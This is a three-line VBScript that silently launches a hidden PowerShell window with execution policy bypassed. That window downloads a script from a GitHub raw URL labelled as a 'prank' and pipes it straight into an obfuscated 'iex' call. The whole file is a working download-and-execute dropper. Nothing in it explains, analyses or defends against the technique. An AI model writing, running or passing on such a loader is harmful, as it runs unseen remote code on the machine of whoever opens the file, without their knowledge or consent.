Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -Ep Bypass -C irm https://raw.githubusercontent.com/gootalive743/MarioBobo-Prank/main/main.ps1 | i`ex", 0, True
